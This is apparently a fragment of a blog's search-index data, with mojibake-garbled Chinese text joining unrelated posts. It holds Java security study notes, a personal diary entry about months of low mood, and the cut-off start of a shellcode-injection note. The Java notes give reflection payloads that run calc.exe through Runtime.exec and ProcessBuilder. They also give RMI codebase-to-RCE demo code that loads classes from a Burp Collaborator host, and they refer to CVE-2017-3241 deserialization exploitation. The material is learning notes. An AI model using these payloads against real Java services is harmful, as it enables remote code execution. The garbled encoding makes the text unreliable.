String.class).invoke(cls.newInstance(), \u0026#34;calc.exe\u0026#34;); é‰´äºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Runtime.getRuntimeè·å–åˆ°Runtimeå¯¹è±¡ï¼Œè¿™é‡ŒæŒ‡å®šçš„é‡è½½ä¸ºæœ€ç®€å•çš„execï¼Œä¾æ—§æ˜¯é€šè¿‡invokeè°ƒç”¨ï¼š\nClass cls = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); cls.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(cls.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(cls), \u0026#34;calc.exe\u0026#34;); invokeä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯æ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ï¼›å¦‚æœæ˜¯é™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»ï¼Œä¸Šé¢çš„payloadç›¸å½“äº\nClass cls = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method execMethod = cls.getMethod(\u0026#34;exec\u0026#34;, String.class); Method getRuntimeMethod = cls.getMethod(\u0026#34;getRuntime\u0026#34;); Object runtime = getRuntimeMethod.invoke(cls); execMethod.invoke(runtime, \u0026#34;calc.exe\u0026#34;); å¦ä¸€ä¸ªAPIæ˜¯getDeclaredMethodï¼Œè·å–å½“å‰ç±»å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼ˆä¸åŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿æ¥çš„æ–¹æ³• åŒ…å«å½“å‰ç±»çš„ç§æœ‰æ–¹æ³•ï¼‰ï¼Œç»“åˆè¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªapiè·å–åˆ°Runtimeå¯¹è±¡å¹¶è°ƒç”¨\nClass cls = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor m = cls.getDeclaredConstructor(); m.setAccessible(true); cls.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(m.newInstance(), \u0026#34;calc.exe\u0026#34;); æ³¨æ„å¿…é¡»åŒæ—¶è®¾ç½®setAccessible(true)ä¿®æ”¹ä½œç”¨åŸŸ\ngetConstructor å½“ä¸€ä¸ªç±»æ²¡æœ‰publicçš„æ— å‚æ„é€ æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é¦–å…ˆç”¨getConstructorè·å–åˆ°æ„é€ å‡½æ•°ï¼ˆéœ€è¦ä¼ å…¥å‚æ•°ç±»å‹ å› ä¸ºå¯ä»¥æœ‰å¤šç§æ„é€ å‡½æ•°ï¼‰ï¼Œä¹‹åç”¨newInstanceå®ä¾‹åŒ–å¯¹è±¡ï¼Œå†ç»è¿‡å¼ºåˆ¶ç±»å‹è½¬æ¢åç”¨startæ‰§è¡Œï¼›è¿™é‡Œç”¨ProcessBuilderä½œç¤ºä¾‹\nClass cls = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ((ProcessBuilder) cls.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc.exe\u0026#34;))).start(); å¦‚æœç›®æ ‡ç¯å¢ƒæ²¡æœ‰å¼ºåˆ¶ç±»å‹è½¬æ¢æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡å€ŸåŠ©åå°„\nClass cls = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); cls.getMethod(\u0026#34;start\u0026#34;).invoke(cls.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc.exe\u0026#34;))); å…ˆè·å–åˆ°startæ–¹æ³•ï¼Œç„¶åinvokeæ‰§è¡Œï¼Œinvoke çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ProcessBuilder Objectï¼Œé€»è¾‘ä¹Ÿæ˜¯å¾ˆé¡ºçš„ï¼šå…ˆè·å–è¦æ‰§è¡Œçš„æ–¹æ³•ï¼Œç„¶åä¼ å…¥æ‰§è¡Œçš„å‚æ•°\nå¦‚æœè¦ä½¿ç”¨ProcessBuilderçš„å¦ä¸€ä¸ªé‡è½½ï¼ˆå‚æ•°ä¸ºå¯å˜é•¿å‚æ•°String\u0026hellip; command ç›¸å½“äºæ•°ç»„ï¼‰ï¼Œå¯ä»¥è¿™æ ·\nClass cls = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ((ProcessBuilder) cls.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;calc.exe\u0026#34;}})).start(); RMI å³Remote Method Invocationï¼Œä¸è®©å®ƒRCEéƒ½å¯¹ä¸èµ·è¿™ä¸ªR\né€šä¿¡å®ç° Serverç¼–å†™å®ç°ç±»å¹¶æ³¨å†Œä¸ºæœåŠ¡createRegistryï¼ŒClientæŸ¥æ‰¾æœåŠ¡å¹¶è·å¾—æ¥å£å®ä¾‹getRegistryï¼Œä¸¤è€…å…±äº«ç›¸åŒçš„æ¥å£interface\nå½“Clientè¿æ¥æ—¶ï¼Œé¦–å…ˆè¿æ¥Registryå¹¶å¯»æ‰¾æƒ³è¦çš„å¯¹è±¡ï¼Œå‘é€Callæ¶ˆæ¯ï¼›ä¹‹åServerè¿”å›å¯¹è±¡ï¼ˆåºåˆ—åŒ–æ•°æ®ï¼‰ï¼ŒReturnDataæ¶ˆæ¯ï¼›Clientæ”¶åˆ°åååºåˆ—åŒ–å¾—åˆ°è¿œç¨‹å¯¹è±¡ï¼Œä¸å…¶å»ºç«‹TCPè¿æ¥ï¼Œåœ¨è¿™ä¸ªæ–°çš„è¿æ¥ä¸­æ‰ä¼šåœ¨Serverç«¯æ‰§è¡Œæ–¹æ³•è°ƒç”¨\nå¯ä»¥ç›´æ¥é€šè¿‡rmi://xxx:xxx/è¿™æ ·çš„åœ°å€è·å–æ‰€æœ‰ç»‘å®šçš„å¯¹è±¡ï¼ˆç›´é€šRMI Registryåå°\nString[] s = Naming.list(\u0026#34;rmi://ip:port\u0026#34;); å¯¹äºrebind, bind, unbindè¿™æ ·çš„å±é™©æ–¹æ³•åªæœ‰å½“æ¥æºæ˜¯locahostæ‰è¡Œï¼Œè¿œç¨‹ç”¨ä¸äº†\nå¯¹äºååºåˆ—åŒ–æ•°æ®ï¼Œå¯ä»¥ç”¨SerializationDumperè¿›è¡Œåˆ†æï¼Œç”¨wireshark å¤åˆ¶-\u0026gt; as a hex Stream\njava -jar SerializationDumper-v1.1.jar \u0026#34;deadbeaf\u0026#34; https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html\nä¸€ä¸ªç®€å•çš„rmiserver\u0026amp;rmiclientçš„æ —å­\npackage server; import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.server.UnicastRemoteObject; public class RMIServer { public interface IRemoteHelloWorld extends Remote{ public String hello() throws RemoteException; } public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld{ protected RemoteHelloWorld() throws RemoteException{ super(); } @Override public String hello() throws RemoteException { System.out.println(\u0026#34;call from\u0026#34;); return \u0026#34;Hello world\u0026#34;; } } public void start() throws Exception{ RemoteHelloWorld h = new RemoteHelloWorld(); LocateRegistry.createRegistry(9092); Naming.rebind(\u0026#34;rmi://127.0.0.1:9092/Hello\u0026#34;, h); } public static void main(String[] args) throws Exception{ new RMIServer().start(); } } package client; import server.RMIServer; import java.rmi.Naming; public class TrainMain { public static void main(String[] args) throws Exception{ RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(\u0026#34;rmi://192.168.31.175:9092/Hello\u0026#34;); String ret = hello.hello(); System.out.println(ret); } } codebase to RCE codebaseæ˜¯ç±»ä¼¼classpathçš„ä¸€ä¸ªåœ°å€ï¼Œå‘ŠçŸ¥JVMå»å“ªé‡Œæœç´¢ç±»ï¼Œå¸¸ç”¨äºhttp, ftpè¿™æ ·è¿œç¨‹çš„æƒ…å†µ\nåœ¨RMIé€šä¿¡è¿‡ç¨‹ä¸­ï¼Œååºåˆ—åŒ–å¯¹è±¡æ—¶å¯»æ‰¾ç±»æ—¶å…ˆåœ¨è‡ªå·±çš„classpathä¸‹å¯»æ‰¾ï¼Œå¦‚æœæœ¬åœ°æ‰¾ä¸åˆ°å°±å›å»è¿œç¨‹åŠ è½½codebaseä¸­çš„ç±»ï¼Œå‡å¦‚æˆ‘ä»¬æŒ‡å®šcodebase=http://example.com/ ç„¶ååŠ è½½org.test.vulnç±»ï¼Œjvmå°±ä¼šä¸‹è½½http://example.com/org/test/vuln.class å¹¶å°†å…¶ä½œä¸ºvulnç±»çš„å­—èŠ‚ç è¿›è¡ŒåŠ è½½\næ‰€ä»¥å¦‚æœcodebaseå¯æ§ï¼Œå†æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œå°±å¯ä»¥åŠ è½½æ¶æ„ç±»äº†ï¼š\nå®‰è£…å¹¶é…ç½®äº†SecurityManager Javaç‰ˆæœ¬ä½äº7u21ã€6u45ï¼Œæˆ–è€…è®¾ç½®äº† java.rmi.server.useCodebaseOnly=false java.rmi.server.useCodebaseOnlyæ˜¯åœ¨Java 7u21ã€6u45çš„æ—¶å€™ä¿®æ”¹çš„ä¸€ä¸ªé»˜è®¤è®¾ç½®ï¼Œå€¼ç”±falseæ”¹ä¸ºäº†trueï¼›åœ¨ä¸ºtrueçš„æƒ…å†µä¸‹JVMåªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„codebaseï¼Œä¸æ”¯æŒä»RMIä¸­è·å–ï¼Œä»¥ä¸‹æ˜¯æµ‹è¯•ä»£ç ï¼š\nServeréƒ¨åˆ†\n// Icalc.java package server; import java.rmi.Remote; import java.rmi.RemoteException; import java.util.List; public interface ICalc extends Remote { public Integer sum(List\u0026lt;Integer\u0026gt; params)throws RemoteException; } // Calc.java package server; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.util.List; public class Calc extends UnicastRemoteObject implements ICalc { public Calc() throws RemoteException{}; public Integer sum(List\u0026lt;Integer\u0026gt; params) throws RemoteException{ Integer sum = 0; for(Integer param: params){ sum += param; } return sum; } } // CalcServer.java package server; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class CalcServer { private void start() throws Exception{ if(System.getSecurityManager() == null){ System.out.println(\u0026#34;Setup SecurityManager\u0026#34;); System.setSecurityManager(new SecurityManager()); } Calc h = new Calc(); LocateRegistry.createRegistry(9093); Naming.rebind(\u0026#34;rmi://192.168.31.175:9093/refobj\u0026#34;, h); } public static void main(String[] args) throws Exception{ System.setProperty(\u0026#34;java.security.policy\u0026#34;,\u0026#34;E:\\\\JavaStudy\\\\test01\\\\client.policy\u0026#34;); System.setProperty(\u0026#34;java.rmi.server.hostname\u0026#34;,\u0026#34;192.168.31.175\u0026#34;); System.setProperty(\u0026#34;java.rmi.server.useCodebaseOnly\u0026#34;,\u0026#34;false\u0026#34;); new CalcServer().start(); } } // client.policy grant { permission java.security.AllPermission; }; Clientéƒ¨åˆ†ï¼ˆç¡®ä¿ä¸Serverçš„classpathä¸åŒï¼‰\n// HelloClient.java package rmiT; import java.io.Serializable; import java.rmi.Naming; import java.util.ArrayList; import java.util.List; public class HelloClient implements Serializable { public class Payload extends ArrayList\u0026lt;Integer\u0026gt;{} public void lookup() throws Exception{ ICalc r = (ICalc) Naming.lookup(\u0026#34;rmi://192.168.31.175:9093/refobj\u0026#34;); List\u0026lt;Integer\u0026gt; li = new Payload(); li.add(3); li.add(4); System.out.println(r.sum(li)); } public static void main(String[] args) throws Exception{ System.setProperty(\u0026#34;java.rmi.server.useCodebaseOnly\u0026#34;,\u0026#34;false\u0026#34;); System.setProperty(\u0026#34;java.security.policy\u0026#34;,\u0026#34;E:\\\\JavaStudy\\\\test01\\\\client.policy\u0026#34;); System.setProperty(\u0026#34;java.rmi.server.codebase\u0026#34;,\u0026#34;http://nxo90f9obuj1boi0bzbdanmca3gt4i.burpcollaborator.net/\u0026#34;); if(System.getSecurityManager() == null){ System.out.println(\u0026#34;Setup SecurityManager\u0026#34;); System.setSecurityManager(new SecurityManager()); } new HelloClient().lookup(); } } // Icalc.java package rmiT; import java.rmi.Remote; import java.rmi.RemoteException; import java.util.List; public interface ICalc extends Remote { public Integer sum(List\u0026lt;Integer\u0026gt; params)throws RemoteException; } è¿è¡ŒCalcServerå’ŒHelloClientï¼Œä¼šçœ‹åˆ°clientçš„æŠ¥é”™\nException in thread \u0026#34;main\u0026#34; java.lang.ClassFormatError: Incompatible magic value 1013478509 in class file server/ICalc åŒæ—¶æ³¨æ„åˆ°æˆ‘ä»¬çš„burpæ”¶åˆ°äº†è¯·æ±‚\nåˆ©ç”¨çš„è¯å°†classæ”¾åœ¨WebæœåŠ¡å™¨çš„ /RMIClient$Payload.classå³å¯\ncodebaseé€šè¿‡[Ljava.rmi.server.ObjID;çš„classAnnotationsï¼ˆç”±annotateClassæ–¹æ³•å†™å…¥ï¼‰ä¼ é€’ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä»¬æ²¡æœ‰RMIå®¢æˆ·ç«¯ï¼Œåªè¦ä¿®æ”¹classAnnotationsçš„å€¼å°±å¯ä»¥æ§åˆ¶codebaseï¼ŒæŒ‡å‘æˆ‘ä»¬çš„ç½‘ç«™\nCVE-2017-3241 Java RMIè¿œç¨‹ååºåˆ—åŒ–ä»»æ„ç±»åŠè¿œç¨‹ä»£ç æ‰§è¡Œè§£æï¼ˆCVE-2017-3241 ï¼‰ | CVE-2017-3241-POC | CVE-2017-3241 Java RMI Registry.bind()ååºåˆ—åŒ–æ¼æ´ | JAVA RMI ååºåˆ—åŒ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ | ä¸€æ¬¡æ”»å‡»å†…ç½‘rmiæœåŠ¡çš„æ·±æ€ | ã€æŠ€æœ¯åˆ†äº«ã€‘Java AMF3 ååºåˆ—åŒ–æ¼æ´åˆ†æ\n\u0026lt;=8u112 ç›´æ¥åˆ©ç”¨\n8u112\u0026lt; JDK \u0026lt; 8u241 éœ€è¦åé“¾æ¶æ„JRMPæœåŠ¡ç«¯ï¼Œæ‰€ä»¥éœ€è¦ç›®æ ‡æœåŠ¡å™¨èƒ½è®¿é—®æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨\nTL;DRï¼šå¯¹äºRMIæœåŠ¡ï¼Œserverç«¯é™¤äº†æ­£å¸¸å®ç°rmiæ¥å£çš„Aç±»ä¹‹å¤–è¿˜å­˜åœ¨ä¸€ä¸ªå®ç°äº†readObjectæ–¹æ³•çš„PublicKnownç±»ï¼ˆæ¯”å¦‚å¸¸è§çš„ccï¼‰ï¼Œæˆ‘ä»¬çš„æ¶æ„å®¢æˆ·ç«¯å¯ä»¥åœ¨æœ¬åœ°ç”¨å®Œæ•´çš„ç±»åé‡å†™Aç±»ï¼ˆè°ƒç”¨PublicKnownçš„ååºåˆ—åŒ–ç›¸å…³æ–¹æ³•è¿›è¡Œrceï¼‰å¹¶ä½œä¸ºRMIçš„å‚æ•°ä¼ å…¥ï¼Œè§¦å‘rceï¼›pocä»£ç è¯·å‚è§è¿™é‡Œ\nå…·ä½“çš„å„ç‰ˆæœ¬ç»•è¿‡å‚è€ƒä¸Šé¢çš„ğŸ”—ï¼Œæˆ‘å°±ä¸ç­é—¨å¼„æ–§äº†å–µï¼ˆï¼‰\n","date":"2022-05-04T16:03:58+08:00","permalink":"https://amiaaaz.github.io/2022/05/04/java-study-notes-04/","section":"posts","tags":["Java"],"title":"Javaå­¦ä¹ ç¬”è®°â…£"},{"categories":[],"contents":"ç»ˆäºè¿˜æ˜¯åŠ¨æ‰‹å†™ç‚¹ä¸œè¥¿äº†ï¼Œå¯èƒ½æ˜¯ç§¯æ”’å¤ªä¹…çš„æƒ…ç»ªå¾—ä¸åˆ°åˆç†çš„å®£æ³„ï¼Œå¯èƒ½æ˜¯å•çº¯åƒé¥±äº†æ’‘çš„\næˆ‘æœ¬ä»¥ä¸º22å¹´ä¼šæ˜¯ä»å¤´åˆ°å°¾é¡ºé¡ºåˆ©åˆ©çš„ä¸€å¹´ï¼Œä½†è¿æ°”è¿™ç§äº‹æƒ…æ€»ä¸å±äºæˆ‘ã€‚1æœˆä»½ç»“æŸäº†å¤§äºŒä¸Šå­¦æœŸçš„æ‰€æœ‰è€ƒè¯•ä¹‹åï¼Œæˆ‘å¸¦ç€è¡Œæè½»è£…å›åˆ°å®¶é‡Œï¼Œé¢„æƒ³äº†ä¸€ä¸ªç›¸å½“å®Œç¾çš„å‡æœŸå­¦ä¹ è®¡åˆ’ï¼Œä½†æ˜¯æ²¡å‡ å¤©å°±åœŸå´©ç“¦è§£äº†â€”â€”ç°åœ¨æƒ³æƒ³åªæ˜¯ä¸€æ—¶è´ªç©ï¼Œåº”è¯¥ç»™è‡ªå·±æ”¾å‡ å¤©å‡çš„ï¼Œä½†å½“æ—¶è¿‡äºå¿ƒæ€¥äº†ã€‚æˆ‘ä¸€æƒ¯å¿ƒæ€å°±å¾ˆå®¹æ˜“å´©ï¼ŒåŠ ä¸Šå„ç§å°é”™ä¸æ–­ï¼Œæ¥è¿æ€€ç–‘äººç”Ÿï¼Œæµªè´¹äº†æ— æ•°æ—¶é—´åœ¨è°ƒæ•´è‡ªå·±ä¸Šã€‚æ˜æ˜å™©å™©çš„å°±åˆ°äº†2æœˆä»½ï¼Œè¿‡å®Œå¹´ä»¥åæ„è¯†åˆ°è‡ªå·±å·²ç»æ‘†çƒ‚äº†æ•´æ•´1ä¸ªæœˆï¼Œåˆå¼€å§‹å¿ƒæ€å¤§å´©ï¼Œæœ€å·®çš„æ—¶å€™è¿ç”µè„‘æˆ‘éƒ½ä¸æƒ³æ‰“å¼€ï¼Œç”šè‡³å®³æ€•æ‰“å¼€Typora, vscodeä¹‹ç±»çš„è½¯ä»¶ï¼Œå®³æ€•çœ‹å…¬ä¼—å·çš„æ–‡ç« ï¼Œå®Œå®Œå…¨å…¨çš„å­¦ä¸è¿›å»ï¼Œåˆå¹²ç€æ€¥\nå°±åœ¨è¿™æ—¶æˆ‘å¾—åˆ°äº†å‚åŠ è¥¿æ¹–è®ºå‰‘çº¿ä¸‹å†³èµ›çš„èµ„æ ¼ï¼Œæˆ‘ä»¥ä¸ºæˆ‘æŠ“ä½äº†å¸Œæœ›ï¼Œæˆ‘å¯ä»¥æ”¹å˜é¢“åºŸçš„çŠ¶æ€å»æ‹¼ä¸€æŠŠã€‚ä¸è¿‡æ˜¾ç„¶è¥¿æ¹–è®ºå‰‘æ˜¯ç¥ä»™æ‰“æ¶ï¼Œæˆ‘ç­‰å°æ¯›è´¼ä¹Ÿåªèƒ½æ··ä¸ªä½ä¿ï¼Œä½†å‚åŠ è¿™ç§å¤§å‹æ¯”èµ›ï¼Œè§åˆ°é‚£ä¹ˆé‚£ä¹ˆå¤šnbçš„å¸ˆå‚…çœŸçš„ç»™æˆ‘æ„Ÿè§¦å¾ˆå¤§ã€‚æ¯”èµ›å®Œå›æ¥ä¹‹åä¸ªäººç”Ÿæ´»ä¸Šå‘ç”Ÿä¸€ç‚¹å•¸å˜åŠ¨ï¼ŒåŒæ—¶é¢„æœŸçš„3æœˆä¸­æ—¬çš„çº¿ä¸‹å¤è¯¾ä¹Ÿå› ä¸ºç–«æƒ…è€Œå–æ¶ˆäº†ï¼Œå…·ä½“æ—¶é—´å¾…å®šã€‚ä¸çŸ¥é“åˆ«çš„å­¦ç”Ÿå†å¾—çŸ¥è¿™ä¸ªæ¶ˆæ¯æ—¶ä»€ä¹ˆååº”ï¼Œè€Œæˆ‘è‡ªèº«çš„æ„Ÿè§‰å°±æ˜¯å½“å¤´ä¸€æ£’ã€‚æˆ‘ä¹‹å‰æ€»æ˜¯è‡ªè¯©è‡ªå­¦èƒ½åŠ›å¼ºï¼Œä½†åœ¨å®¶å­¦ä¹ çœŸçš„è·Ÿåç‰¢æ— å¼‚ï¼Œçœ‹ä¸Šå»åƒç©¿ä¸æ„ï¼Œä½†å°±åƒæ˜¯ä¸ªç²¾è‡´çš„ç¬¼å­ä¸€èˆ¬ï¼Œæ‰€æœ‰è§¦è§’éƒ½è¢«ç›–ä¸Šäº†èƒ¶å¸ƒã€‚ä¸ä»…æ˜¯å¿ƒç†ä¸Šç…ç†¬ï¼Œèº«ä½“ä¸Šä¹Ÿåœ¨æŠ¥è­¦ã€‚é•¿æœŸçš„ä¸è‰¯åå§¿å¯¼è‡´è…°æ¤è„ŠæŸ±é¢ˆæ¤éƒ½å‡ºäº†é—®é¢˜ï¼Œè¿˜æœ‰ä¸åœåœ°è„±å‘æ›´åŠ å‰§äº†æˆ‘çš„ææ…Œã€‚ä¸€ç›´èé¡çš„å­¦ä¹ çŠ¶æ€è®©æˆ‘ä¸€ç›´æä¸èµ·åŠ²ï¼Œè¿™æ ·çš„æä¸èµ·åŠ²åˆåˆºæ¿€æˆ‘æƒ…ç»ªæ›´åŠ ä½è½ï¼Œå®Œæˆäº†ä¸€ä¸ªé»‘æ¶çš„é—­ç¯ã€‚æˆ‘å°è¯•å»æ‰¾äººå€¾è¯‰ï¼Œæ— æœï¼Œè°æ„¿æ„å½“åˆ«äººçš„æƒ…ç»ªåƒåœ¾æ¡¶å‘¢ï¼Ÿæ¥ç€å°±å¼€å§‹æŒç»­æ€§çš„å¤±çœ ï¼Œæ„ˆæ¼”æ„ˆçƒˆã€‚åŠ ä¸Šæˆ‘æœ¬èº«ç½‘ä¸Šå†²æµªçš„å±æ€§ç‚¹å®åœ¨æ˜¯å¤ªé«˜äº†ï¼Œå¯¼è‡´æµ¸æ·«åœ¨è™šæ‹Ÿæ–‡åŒ–ä¸­è¶Šæ¥è¶Šä¹…ä¹‹åé€æ¸å¤±å»äº†ä¸ç°å®çš„è¾¹ç•Œ\næŸå¤©æ™šä¸Šæˆ‘å¼€å§‹å°è¯•æ‰¾å›æˆ‘çš„ç°å®ç”Ÿæ´»æ—¶ï¼Œæˆ‘å‘ç°å¤±å»äº†ä¸€åˆ‡ã€‚æˆ‘æ— æ³•å†æ‰¾åˆ°åˆé€‚çš„è¯­è¨€æè¿°è¿™ç§æ„Ÿè§‰ï¼Œä½†å¯èƒ½å®ƒååˆ†æ¥è¿‘â€œå¤±æ§â€ã€‚åœ¨æˆ‘æ‘†çƒ‚çš„å‡ ä¸ªæœˆé‡Œåˆ«äººéƒ½æ²¡æœ‰åœä¸‹è„šæ­¥ï¼ŒæŠ€æœ¯æ°´å¹³ä¸æ–­æå‡ï¼Œè€Œæˆ‘è¿˜æ˜¯ä¹‹å‰é‚£ä¸ªéœ€è¦åˆ«äººå¸¦çš„è¶…çº§æ— æ•Œå¤§èœé¸¡ã€‚å¯èƒ½ä¼šæœ‰äººè§‰å¾—è¿™æœ‰å•¥å•Šï¼Œå†è¿å¤´å¥‹èµ·ç›´è¿½ä¸å°±è¡Œäº†ï¼Ÿä½†å¯¹äºæˆ‘æ¥è¯´æ¥å—è¿™æ ·çš„ç°å®æœ¬èº«å°±æ˜¯ä¸€ä¸ªå·¨å¤§çš„æŒ‘æˆ˜ã€‚æˆ‘å®³æ€•å¤±è´¥ï¼Œæ— æ³•æ¥å—è¿™æ ·çš„è‡ªå·±ï¼Œè¿™æ ·åºŸç‰©çš„è‡ªå·±ï¼Œæˆ‘å¼€å§‹æŠ±æ€¨è®¨åŒçš„ç¯å¢ƒï¼ŒåŒæ—¶ä¸åœåœ°è¿›è¡Œè‡ªæˆ‘å¦å®šï¼Œçœ‹åˆ°çš„æ‰€æœ‰ä¸œè¥¿éƒ½ä¼šåƒé’ˆä¸€æ ·åˆºè¿›å¿ƒé‡Œã€‚é‚£å¤©å‡Œæ™¨1ç‚¹ï¼Œæˆ´ç€è€³æœºå•æ›²å¾ªç¯ã€ŠWhat Other People Sayã€‹ï¼Œæ¯æ¬¡å¬åˆ°\u0026quot;I used to call my mum every Sundayï¼ŒSo she knew her love wasnâ€™t far awayï¼ŒBut now Iâ€™m all fucked up out in LAï¼ŒCause I care more about what other people sayï¼ŒI used to not take chances with godâ€™s nameï¼ŒBut itâ€™s been so long since I last prayedï¼ŒAnd now Iâ€™m all fucked up and my heartâ€™s changedï¼ŒCause I care more about what other people say\u0026quot;ï¼Œæˆ‘å”¯ä¸€ä¼šçš„ä¹Ÿå°±åªæ˜¯å“­äº†\nä¹‹å‰åˆ·çŸ¥ä¹æ—¶å…³æ³¨äº†ä¸€ä¸ªé—®é¢˜â€œæœ‰ä»€ä¹ˆäº‹æ˜¯ä½è°·æœŸæ‰ä¼šæ˜ç™½çš„â€ï¼Œä½†æˆ‘çŸ¥é“æœ‰ä¸€ä¸ªå›ç­”æ˜¯æœ€ä¸è¯¥å‡ºç°åœ¨è¿™ä¸ªé—®é¢˜ä¸‹é¢çš„ï¼Œé‚£å°±æ˜¯â€œå·²ç»å¤„äºä½ç‚¹ï¼Œå†å¾€å‰å°±æ˜¯å‘ä¸Šâ€ï¼Œè¿™å¥è¯è°è¯´è°å‚»é€¼ï¼Œå› ä¸ºç°å®ä¼šå‘Šè¯‰ä½ è¿˜æœ‰è´Ÿæ•°å¯ä»¥æ¥ç€è·Œâ€”â€”ä¸è¿‡æœ‰è°ä¼šåœ¨æ„ä¸€ä¸ªè·¯è¾¹è¢«è¸©æ‰äº†çš„å¯ä¹ç½å­çš„å‘½è¿å‘¢ï¼Ÿæˆ‘å®³æ€•æ°´ç¾¤ï¼Œå®³æ€•ç‚¹å¼€æœ€æ–°æ¯”èµ›çš„wpï¼Œå®³æ€•ç‚¹å¼€æœ€æ–°æ¼æ´çš„é€šæŠ¥ï¼Œå®³æ€•ç‚¹å¼€çŸ¥è¯†æ˜Ÿçƒçš„çº¢ç‚¹ï¼Œè¿™ç§åƒåœ¾ä¸€æ ·çš„çŠ¶æ€æ˜¯æˆ‘ä¹‹å‰é„™è§†çš„ï¼Œè€Œç°åœ¨æˆ‘åªèƒ½çœ‹ç€è‡ªå·±æººæ­»å´æ— èƒ½ä¸ºåŠ›ï¼Œæ´»æˆäº†æˆ‘è‡ªå·±æœ€è®¨åŒçš„æ ·å­ï¼Œé¢ç›®å¯æ†\nèƒ½å†™ä¸‹è¿™äº›æ–‡å­—çš„æˆ‘æƒ…ç»ªå·²ç»ç¨³å®šäº†å¾ˆå¤šï¼Œä½†ä¸å¯å¦è®¤çš„æ˜¯å‰é¢æ‰€æœ‰çŠ¯ä¸‹çš„é”™è¯¯éƒ½å¿…é¡»æˆ‘è‡ªå·±å…¨è´£ä¹°å•ï¼ŒæŒç»­äº†110å¤©çš„æ‘†çƒ‚å¸¦æ¥çš„æ˜¯ä¸€ç¬”çƒ‚è´¦ï¼Œè¿™äº›è‹¦æœä¹Ÿå¿…é¡»æˆ‘è‡ªå·±åä¸‹ã€‚ä»¥ä¸€ä¸ªæ—è§‚è€…è§†è§’æ¥çœ‹ï¼Œè¿™å¤ªä»–å¦ˆä¸æˆç†Ÿäº†å§ï¼Œæç ¸äº†é‚£ä¹ˆå¤šï¼Œè¿™ä¹Ÿæ˜¯äººèƒ½å¹²å‡ºæ¥çš„äº‹ï¼Ÿè¿è‡ªå·±éƒ½ç®¡ç†ä¸å¥½ï¼Œå°±è¿™ï¼Ÿå°±è¿™è¿˜å­¦ç½‘å®‰ï¼Ÿç¡®å®ï¼ŒçœŸæ˜¯ç™¾å¹´ä¸é‡çš„è ¢è›‹æ‰èƒ½å¹²å‡ºæ¥è¿™ç§äº‹ï¼ŒæŒç»­åœ°æ‰“ç†ä¸å¥½è‡ªå·±çš„æƒ…ç»ªå’Œç”Ÿæ´»ï¼Œè®©èº«è¾¹çš„äººæ‹…å¿ƒå’Œéš¾å—ï¼ŒçœŸçš„ç›¸å½“å¤±è´¥ã€‚ä½†è ¢è›‹ä¹Ÿæœ‰æ”¹å˜çš„æƒåˆ©å§ï¼Œæˆ‘æƒ³æˆ‘åº”è¯¥å¯ä»¥ï¼Œå¹¶ä¸”å¿…é¡»å¯ä»¥ï¼Œæˆ‘è¦æ‰¾å›ä¹‹å‰çš„æˆ‘\nä¸€å¥è°šè¯­æ˜¯è¿™æ ·çš„ï¼šApril showers bring May flowersï¼Œå››æœˆé›¨å¸¦æ¥äº”æœˆèŠ±ã€‚ç»å†äº†å¦‚æ­¤æ“è›‹çš„ä¸‰ä¸ªæœˆï¼Œæˆ‘å·²ä¸æ•¢å¥¢æ±‚å¤ªå¤šï¼Œåªæƒ³ä»¥ä¸€ä¸ªæ¥è¿‘è‰¯å¥½çš„çŠ¶æ€æ¥è¿æ¥ä¹‹åçš„æŒ‘æˆ˜å’Œä¹‹å‰çš„æ¬ å€ºï¼ŒåŠªåŠ›å»åšï¼Œå¹¶ä¸”å¯¹ç»“æœæ— æ‚”ï¼Œèƒ½å¯¹å¾—èµ·è‡ªå·±\n2022å¹´4æœˆ30æ—¥å‡Œæ™¨2ç‚¹55åˆ†ï¼Œå‘¨å…­äºå®¶ä¸­\n","date":"2022-04-30T03:02:00+08:00","permalink":"https://amiaaaz.github.io/life/short-diary-in-april/","section":"life","tags":[],"title":"å›°äºå®¶ä¸­3ä¸ªæœˆæœ‰æ„Ÿ"},{"categories":["NOTES\u0026SUMMARY"],"contents":"shellcodeæ³¨å…¥ PESecurityå¯ä»¥æ£€æµ‹ç›®æ ‡å¯¹è±¡æ˜¯å¦å¼€å¯ASLRç­‰å®‰å…¨é€‰é¡¹\nImport-Module .\\Get-PESecurity.psm1 Get-PESecurity -file \u0026lt;signle file 